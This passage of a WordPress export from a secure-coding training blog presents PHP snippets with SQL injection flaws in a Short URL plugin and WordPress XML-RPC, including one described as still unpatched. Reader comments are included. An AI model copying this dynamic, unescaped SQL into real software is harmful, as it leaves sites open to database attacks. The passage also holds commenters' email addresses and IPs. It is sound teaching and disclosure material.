		<wp:post_date>2011-01-17 03:14:26</wp:post_date>
		<wp:post_date_gmt>2011-01-17 10:14:26</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vegetables</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/h2NaXP]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[ddb45042072a8beeb5310bf675a4d8dc]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1486</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Code Snippet Vulnerability Code Example «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/01/vegetables/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-01-17 05:04:16</wp:comment_date>
			<wp:comment_date_gmt>2011-01-17 12:04:16</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by @montanaflynn. @montanaflynn said: New Post: Vegetables http://bit.ly/eAD8gz #secure #code #dev - via @spotthevuln http://bit.ly/eSaG5k [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295265856.2744";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295592569.2407";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1510</wp:comment_id>
			<wp:comment_author><![CDATA[dangerduo]]></wp:comment_author>
			<wp:comment_author_email>jhokyu@yahoo.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>216.52.215.232</wp:comment_author_IP>
			<wp:comment_date>2011-01-20 17:23:15</wp:comment_date>
			<wp:comment_date_gmt>2011-01-21 00:23:15</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[it looks like it is a sql injection issue with "create", "edit" and "delete" where it did not perform any validation on the POST values and pass it over to the query method]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295569395.8067";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295592571.8865";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Vegetables - SQL Injection</title>
		<link>http://spotthevuln.com/2011/01/vegetables-sql-injection/</link>
		<pubDate>Fri, 21 Jan 2011 11:51:00 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1288</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: Short URL Plugin 

Fixed in Version: Changeset 55280

Issue Type: SQL Injection

Original Code: <a title="Vegetables" href="https://spotthevuln.com/2011/01/vegetables/" target="_blank">Found    Here</a>
<h3>Description</h3>
This weeks’ vulnerabilities were a couple of SQL injection bugs in the Short URL Plugin for Wordpress.  The symptoms for the issues indicate classic SQL injection, let’s have a quick look at the code.  First, looking over the code sample, we see a couple of dynamically built SQL statements.  It would probably make sense to spend a bit of time and convert these dynamic SQL statements into prepared statements, that way you won’t have to worry about a code change inadvertently re-introducing a SQL injection flaw or an escaping filter bypass.  With dynamically built SQL statements we’ll also have to trace each variable until we can determine whether the value can be controlled by an attacker.  Lucky for us, the variable assignments are very close to the SQL statements.  In the vulnerable sample, we see that the author is taking values directly from a POST request and using those tainted values to build SQL statements.  Looking at the check-in, we see that the developer chose to use Wordpress’ built-in escaping function for escaping user/attacker controlled data before passing it to a SQL statement.

Although the checked-in fixes were straightforward, I was surprised to see that the developers missed an obvious SQL injection on line 56.  Same classic SQL injection symptoms, the only difference is the dynamic SQL being built is a DELETE SQL statement as opposed to an INSERT or UPDATE.  For those that are wondering… YES, this SQL injection is still present in the latest version of the plug-in!  If you happen to be using this plug-in on your website, I would recommend you escape $delete_id before passing it to a SQL statement!  I notified the plug-in author, hopefully they’ll be a patch soon.  

Is this the first Spot-The-Vuln.com 0day?


<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="27-30,41-46,56"]
&lt;?php
...snip...
function kd_admin_options_su(){ 
   global $table_prefix, $wpdb, $user_ID;
   
   $table_name = $table_prefix . &quot;short_url&quot;;
   
   if($wpdb-&gt;get_var(&quot;show tables like '$table_name'&quot;) != $table_name){
   
   $sql = &quot;CREATE TABLE &quot;.$table_name.&quot; (
   link_id int(11) NOT NULL auto_increment,
   link_url text NOT NULL,
   link_desc text NOT NULL,
   link_count int(11) NOT NULL default '0',
   PRIMARY KEY  (`link_id`)
   );&quot;;
   
   require_once(ABSPATH . 'wp-admin/upgrade-functions.php');
   dbDelta($sql);
   
   }


   if(isset($_POST['action'])) {
      $action = $_POST['action'];

if($action == &quot;create&quot;){
-  $add_url = $_POST['form_url'];
-  $add_desc = $_POST['form_desc'];
+  $add_url = $wpdb-&gt;escape($_POST['form_url']);  
+  $add_desc = $wpdb-&gt;escape($_POST['form_desc']);  

   if($add_url == &quot;http://&quot; || (!$add_url)){ $ERR = $ERR . &quot;&lt;br&gt;You must enter a URL to redirect to!&quot;; }
   if(!$ERR){
      $wpdb-&gt;query(&quot;INSERT INTO $table_name (link_url,link_desc) VALUES ('$add_url','$add_desc')&quot;);
         $new_url = get_option(&quot;siteurl&quot;) . &quot;/u/&quot; . mysql_insert_id();
         $MES = $MES . &quot;&lt;br&gt;The redirect URL has been added. Your new Short URL is: &quot; . $new_url;
         }
      }

if($action == &quot;edit&quot;){
-  $edit_id = $_POST['id'];
-  $edit_url = $_POST['form_url'];
-  $edit_desc = $_POST['form_desc'];
+  $edit_id = $wpdb-&gt;escape($_POST['id']);  
+  $edit_url = $wpdb-&gt;escape($_POST['form_url']);  
+  $edit_desc = $wpdb-&gt;escape($_POST['form_desc']); 

   if($edit_url == &quot;http://&quot; || (!$edit_url)){ $ERR = $ERR . &quot;&lt;br&gt;You must enter a URL to redirect to!&quot;; }
   if(!$ERR){
      $wpdb-&gt;query(&quot;UPDATE $table_name SET link_url='$edit_url',link_desc='$edit_desc' WHERE link_id = $edit_id&quot;);
         $MES = $MES . &quot;&lt;br&gt;The redirect URL has been modified.&quot;;
         }
      }

   
if($action == &quot;delete&quot;){
   $delete_id = $_POST['id']; 
   $wpdb-&gt;query(&quot;DELETE FROM $table_name WHERE link_id = '$delete_id'&quot;);
   $MES = $MES . &quot;&lt;br&gt;Redirect deleted!&quot;;
   }  
   
if($action == &quot;clearall&quot;){
        $wpdb-&gt;query(&quot;UPDATE $table_name SET link_count='0' WHERE link_count &gt; 0&quot;);
   $MES = $MES . &quot;&lt;br&gt;Counts have been reset!&quot;;
   }
}
   ?&gt;
   &lt;div class=wrap&gt;
   &lt;form method=&quot;post&quot;&gt;
      &lt;h2&gt;Short URL Admin&lt;/h2&gt;
&lt;?php if($ERR){ echo &quot;&lt;p&gt;&quot; . $ERR . &quot;&lt;/p&gt;&quot;; }
if($MES){ echo &quot;&lt;p&gt;&quot; . $MES . &quot;&lt;/p&gt;&quot;; } ?&gt;
      &lt;p&gt;Short URL allows you to create shorter URL's and keeps track of how many 
times a link has been clicked. It's useful for managing downloads, keeping track
of outbound links and for masking URL's. Clicking the Clear All Clicks button
will reset the count for each entry. Visit the &lt;a href=&quot;http://www.harleyquine.com/php-scripts/short-url-plugin/&quot;&gt;plugin page&lt;/a&gt; for more information about this plugin.&lt;/p&gt;

&lt;h2&gt;Current Redirects&lt;/h2&gt;
&lt;table class=&quot;widefat&quot;&gt;
   &lt;thead&gt;
   &lt;tr&gt;
   &lt;th scope=&quot;col&quot;&gt;Short URL (The URL to use)&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Real URL (Where it redirects to)&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Notes&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Amount of Clicks&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Manage&lt;/th&gt;
   &lt;/tr&gt;
      &lt;/thead&gt;
   &lt;tbody id=&quot;the-list&quot;&gt;
&lt;?php 
   $rowdata = $wpdb-&gt;get_results(&quot;SELECT * FROM $table_name&quot;);

   foreach ($rowdata as $row) {
   $is_editing = $_POST['edit_id'];
   if($is_editing){
      if($is_editing == $row-&gt;link_id){ $EDIT = 1; $EDIT_ID = $row-&gt;link_id; $EDIT_URL = $row-&gt;link_url; $EDIT_DESC = $row-&gt;link_desc; }
      }
?&gt;
   &lt;tr class='&lt;?php echo $class; ?&gt;'&gt;

   &lt;th scope=&quot;row&quot;&gt;&lt;a href=&quot;&lt;? echo get_option(&quot;siteurl&quot;) . &quot;/u/&quot; . $row-&gt;link_id; ?&gt;&quot; target=&quot;_blank&quot;&gt;&lt;? echo get_option(&quot;siteurl&quot;) . &quot;/u/&quot; . $row-&gt;link_id; ?&gt;&lt;/a&gt;&lt;/th&gt;
   &lt;td&gt;&lt;? echo $row-&gt;link_url; ?&gt;&lt;/td&gt;
   &lt;td&gt;&lt;? echo $row-&gt;link_desc; ?&gt;&lt;/td&gt;
   &lt;td&gt;&lt;? echo $row-&gt;link_count; ?&gt;&lt;/td&gt;
   &lt;td&gt;&lt;form method=&quot;post&quot; name=&quot;delete&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;delete&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&lt;? echo $row-&gt;link_id; ?&gt;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Delete&quot;&gt;&lt;/form&gt;&lt;form method=&quot;post&quot; name=&quot;edit&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;edit_id&quot; value=&quot;&lt;? echo $row-&gt;link_id; ?&gt;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Edit&quot;&gt;&lt;/form&gt;&lt;/td&gt;
...snip...[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1288</wp:post_id>
		<wp:post_date>2011-01-21 04:51:00</wp:post_date>
		<wp:post_date_gmt>2011-01-21 11:51:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vegetables-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="post_tag" nicename="dynamic-sql-statements"><![CDATA[dynamic sql statements]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="short-url"><![CDATA[short url]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress-plugin"><![CDATA[wordpress plugin]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/eT91HK]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[ff5d64e46f2dc80235ac4913fa821b1c]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1532</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>76.102.16.4</wp:comment_author_IP>
			<wp:comment_date>2011-01-24 00:02:22</wp:comment_date>
			<wp:comment_date_gmt>2011-01-24 07:02:22</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I totally agree!  We didn't write these patches :)  

I'm still trying to convince the plugin author to patch the missed SQL injection bug in the code.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>1530</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295852542.7973";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1530</wp:comment_id>
			<wp:comment_author><![CDATA[GM]]></wp:comment_author>
			<wp:comment_author_email>dridma@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.183.85.247</wp:comment_author_IP>
			<wp:comment_date>2011-01-23 17:00:40</wp:comment_date>
			<wp:comment_date_gmt>2011-01-24 00:00:40</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Nice post, but why not use ‘$wpdb-&gt;prepare()’ instead?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295827240.8333";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295852427.2601";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1531</wp:comment_id>
			<wp:comment_author><![CDATA[GM]]></wp:comment_author>
			<wp:comment_author_email>dridma@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.183.85.247</wp:comment_author_IP>
			<wp:comment_date>2011-01-23 17:03:39</wp:comment_date>
			<wp:comment_date_gmt>2011-01-24 00:03:39</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Here is a link to the new standard re the function for escaping variables passed into an SQL statement:

http://codex.wordpress.org/Function_Reference/wpdb_Class#prepare_-_Protect_Your_SQL_Queries_Against_SQL_Injection_Attacks]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295827419.6974";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295852427.9637";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1544</wp:comment_id>
			<wp:comment_author><![CDATA[GM]]></wp:comment_author>
			<wp:comment_author_email>dridma@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.183.85.247</wp:comment_author_IP>
			<wp:comment_date>2011-01-25 15:02:53</wp:comment_date>
			<wp:comment_date_gmt>2011-01-25 22:02:53</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Cool, keep up the great work.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295995372.0279";s:7:"message";s:45:"BrettH changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295992973.1305";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1515</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention PHP, SQL Injection, Solution, Wordpress Vulnerability Code Example «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/01/vegetables-sql-injection/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-01-21 05:25:38</wp:comment_date>
			<wp:comment_date_gmt>2011-01-21 12:25:38</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by @montanaflynn and netsecured, Spot The Vuln. Spot The Vuln said: New Post: Vegetables - SQL Injection http://bit.ly/eT91HK #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295612738.9934";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1295852426.2358";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Wood</title>
		<link>http://spotthevuln.com/2011/01/wood-2/</link>
		<pubDate>Mon, 24 Jan 2011 12:00:11 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1297</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Remember, a chip on the shoulder is a sure sign of wood higher up.</strong> <br><strong> - Brigham Young
</strong>
[sourcecode language="php"]
&lt;?php
...snip...
	function wp_newCategory($args) {
		$this-&gt;escape($args);

		$blog_id				= (int) $args[0];
		$username				= $args[1];
		$password				= $args[2];
		$category				= $args[3];

		if(!$this-&gt;login_pass_ok($username, $password)) {
			return($this-&gt;error);
		}

		// Set the user context and make sure they are
		// allowed to add a category.
		set_current_user(0, $username);
		if(!current_user_can(&quot;manage_categories&quot;, $page_id)) {
			return(new IXR_Error(401, __(&quot;Sorry, you do not have the right to add a category.&quot;)));
		}

		// We need this to make use of the wp_insert_category()
		// funciton.
		require_once(ABSPATH . &quot;wp-admin/admin-db.php&quot;);

		// If no slug was provided make it empty so that
		// WordPress will generate one.
		if(empty($category[&quot;slug&quot;])) {
			$category[&quot;slug&quot;] = &quot;&quot;;
		}

		// If no parent_id was provided make it empty
		// so that it will be a top level page (no parent).
		if ( !isset($category[&quot;parent_id&quot;]) )
			$category[&quot;parent_id&quot;] = &quot;&quot;;

		// If no description was provided make it empty.
		if(empty($category[&quot;description&quot;])) {
			$category[&quot;description&quot;] = &quot;&quot;;
		}
	
		$new_category = array(
			&quot;cat_name&quot;				=&gt; $category[&quot;name&quot;],
			&quot;category_nicename&quot;		=&gt; $category[&quot;slug&quot;],
			&quot;category_parent&quot;		=&gt; $category[&quot;parent_id&quot;],
			&quot;category_description&quot;	=&gt; $category[&quot;description&quot;]
		);

		$cat_id = wp_insert_category($new_category);
		if(!$cat_id) {
			return(new IXR_Error(500, __(&quot;Sorry, the new category failed.&quot;)));
		}

		return($cat_id);
	}


	function wp_suggestCategories($args) {
		global $wpdb;

		$this-&gt;escape($args);

		$blog_id				= (int) $args[0];
		$username				= $args[1];
		$password				= $args[2];
		$category				= $args[3];
		$max_results			= $args[4];

		if(!$this-&gt;login_pass_ok($username, $password)) {
			return($this-&gt;error);
		}

		// Only set a limit if one was provided.
		$limit = &quot;&quot;;
		if(!empty($max_results)) {
			$limit = &quot;LIMIT {$max_results}&quot;;
		}

		$category_suggestions = $wpdb-&gt;get_results(&quot;
			SELECT cat_ID category_id,
				cat_name category_name
			FROM {$wpdb-&gt;categories}
			WHERE cat_name LIKE '{$category}%'
			{$limit}
		&quot;);

		return($category_suggestions);
	}


	/* Blogger API functions
	 * specs on http://plant.blogger.com/api and http://groups.yahoo.com/group/bloggerDev/
	 */


	/* blogger.getUsersBlogs will make more sense once we support multiple blogs */
	function blogger_getUsersBlogs($args) {

		$this-&gt;escape($args);

		$user_login = $args[1];
		$user_pass  = $args[2];

		if (!$this-&gt;login_pass_ok($user_login, $user_pass)) {
			return $this-&gt;error;
		}

		set_current_user(0, $user_login);
		$is_admin = current_user_can('level_8');

		$struct = array(
			'isAdmin'  =&gt; $is_admin,
			'url'      =&gt; get_option('home') . '/',
			'blogid'   =&gt; '1',
			'blogName' =&gt; get_option('blogname')
		);

		return array($struct);
	}

...snip...
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1297</wp:post_id>
		<wp:post_date>2011-01-24 05:00:11</wp:post_date>
		<wp:post_date_gmt>2011-01-24 12:00:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>wood-2</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/hzVteC]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[f02da124aab4e6ee972bbb5d4eb167fa]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Wood - SQL Injection</title>
		<link>http://spotthevuln.com/2011/01/wood-sql-injection/</link>
		<pubDate>Fri, 28 Jan 2011 11:10:12 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1303</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: WordPress Core

Fixed in Version: 2.2

Issue Type: SQL Injection

Original Code: <a title="Wood" href="http://spotthevuln.com/2011/01/wood-2/" target="_blank">Found    Here</a>
<h3>Description</h3>
This is a fairly straight forward SQL Injection bug here.  First, although we can’t see exactly where $args[] is set, we have some strong clues that it contains user/attacker controlled data.  For example, the first function on the code snippet wp_newCategory() takes an $args parameter and the first thing it does is escape the values within the array.  The names of variables holding various values in the array also provide clues that $args cannot be trusted.

